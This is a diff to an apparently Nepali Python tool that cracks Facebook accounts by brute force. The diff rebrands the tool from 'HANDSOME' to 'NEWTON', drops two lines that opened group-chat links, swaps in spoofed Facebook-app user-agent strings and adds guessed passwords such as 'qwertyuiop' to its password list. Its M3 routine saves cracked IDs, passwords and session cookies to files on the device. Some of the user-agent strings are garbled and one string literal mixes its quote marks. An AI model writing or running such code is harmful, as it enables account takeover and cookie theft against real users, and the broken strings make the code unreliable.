@@ -195,8 +195,6 @@ def joined(ids):
         creation = '\33[1;37m| \33[1;32m2006/2007'
     else:creation=''
     return creation 
-os.system("xdg-open https://chat.whatsapp.com/IrocJuk01SwGYYQuZqQ1Bd")
-os.system("xdg-open https://m.me/j/Aba7_vxydBZSush6/")
 def getKey():
 
     uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
@@ -207,36 +205,23 @@ def getKey():
     bumper = bxd+id+xp
     return bumper
 def ua():
-    flatsurface = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1;CPH3818 Build/RKQ1.211103.002) FB_IAB/FB4A;FBAV/268.1.0.54.121; FB_IAB/Orca-Android;FBAV/283.0.0.16.120; FBDM/{density=2.0, width=720, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca- Android;FBAV/283.0.0.16.120;]','Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1;CHP7800 Build/SP1A.210812.016) FB_IAB/FB4A;FBAV/268.1.0.54.121; FB_IAB/Orca-Android;FBAV/283.0.0.16.120; FBDM/{density=2.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca- Android;FBAV/283.0.0.16.120;]','Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1;CHP7800 Build/TP1A. 220905.001) FB_IAB/FB4A;FBAV/268.1.0.54.121; FB_IAB/Orca-Android;FBAV/283.0.0.16.120; FBDM/{density=1.5, width=720, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca- Android;FBAV/283.0.0.16.120;]'
-    return random.choice(flatsurface)
-
+	END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
+	return END
+	
 def iAmMethod2Ua():
-    END = 'Dalvik/2.1.0 (Linux; U; Android 9.0.1; CPH3818 Build/SKQ1.210216.001) FB_IAB/FB4A; fbdv = CPH3818; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=3.0, width=2024, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:V4532W AppleWebKit/537.36 (KHTML, like Gecko)84 0 5906 134 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:F6942Z AppleWebKit/537.36 (KHTML, like Gecko)94 0 6695 124 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.1; CHP7800 Build/SP1A.210812.016) FB_IAB/FB4A; fbdv = CHP7800; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 8.0.1; CPH3818 Build/SKQ1.210216.001) FB_IAB/FB4A; fbdv = CPH3818; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=2.5, width=2024, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 7.0.1; CHP7800 Build/ΤΡ1Α.220905.001) FB_IAB/FB4A; fbdv = CHP7800; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
     return ua        
     ua = 'Dalvik/2.1.0 (Linux; U; Android 9.0.1; CPH3818 Build/SKQ1.210216.001) FB_IAB/FB4A; fbdv = CPH3818; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=3.0, width=1990, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
     return ua
 logo=("""
 \033[1;37m   
   
-ooooo      ooo oooooooooooo oooooo   oooooo     oooo ooooooooooooo   .oooooo.   ooooo      ooo 
-`888b.     `8' `888'     `8  `888.    `888.     .8'  8'   888   `8  d8P'  `Y8b  `888b.     `8' 
- 8 `88b.    8   888           `888.   .8888.   .8'        888      888      888  8 `88b.    8  
- 8   `88b.  8   888oooo8       `888  .8'`888. .8'         888      888      888  8   `88b.  8  
- 8     `88b.8   888    "        `888.8'  `888.8'          888      888      888  8     `88b.8  
- 8       `888   888       o      `888'    `888'           888      `88b    d88'  8       `888  
-o8o        `8  o888ooooood8       `8'      `8'           o888o      `Y8bood8P'  o8o        `8  
-                                                                                               
-                                                                                               
-                                                                                                                                                                         
-
-NOTE:(NAME HAS BEEN CHANGED FROM HANDSOME TO NEWTON)				
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
- ┃DEVELOPER:HANDSOME         ┃𝐒𝐓𝐀𝐓𝐔𝐒: PREMIUM    ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:3.4🔥      ┃
- ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
- ┃𝐆𝐈𝐓𝐇𝐔𝐁:VANDAINA          ┃ 𝐓𝐎𝐎𝐋 : FILE         |
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
+DDDDDDD
+   D    D 
+   D    D 
+   D    D 
+DDDDDDD                                                                                                                                
 \033[1;32m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
@@ -337,6 +322,9 @@ def file():
                                         plist.append('last@123') 
                                         plist.append('Nepal123')
                                         plist.append('nepal@123')
+                                        plist.append('QWERTYUIOP')
+                                        plist.append('qwertyuiop')
+                                        plist.append('@first123')
                                 else:
                                         try:
                                                 linex()
@@ -785,7 +773,7 @@ def M2(ids,names,passlist):
 def M3(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [HANDSOME-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -855,9 +843,9 @@ def M3(ids,names,passlist):
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                       #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
-                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                      #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        open('/sdcard/HANDSOME_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALONE_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        open('/sdcard/NEWTON_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
                                         break
